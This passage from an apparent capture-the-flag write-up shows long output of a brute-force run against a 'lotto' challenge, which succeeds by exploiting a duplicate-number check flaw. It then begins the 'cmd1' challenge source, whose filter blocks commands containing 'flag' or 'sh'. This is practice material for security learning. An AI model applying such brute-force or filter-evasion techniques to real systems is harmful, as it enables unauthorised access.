</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;sorry mom... I FORGOT to check duplicate numbers... :(\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;sorry mom... I FORGOT to check duplicate numbers... :(\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;sorry mom... I FORGOT to check duplicate numbers... :(\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;sorry mom... I FORGOT to check duplicate numbers... :(\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;sorry mom... I FORGOT to check duplicate numbers... :(\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span><span class="line"><span class="cl">b&#39;- Select Menu -\n&#39;
</span></span><span class="line"><span class="cl">b&#39;1. Play Lotto\n&#39;
</span></span><span class="line"><span class="cl">b&#39;2. Help\n&#39;
</span></span><span class="line"><span class="cl">b&#39;3. Exit\n&#39;
</span></span><span class="line"><span class="cl">b&#39;Submit your 6 lotto bytes : Lotto Start!\n&#39;
</span></span><span class="line"><span class="cl">b&#39;bad luck...\n&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="14-cmd1" class="headerLink">
    <a href="#14-cmd1" class="header-mark"></a>14 cmd1</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>  
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">filter</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">cmd</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">r</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">+=</span> <span class="nf">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&#34;flag&#34;</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">+=</span> <span class="nf">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&#34;sh&#34;</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
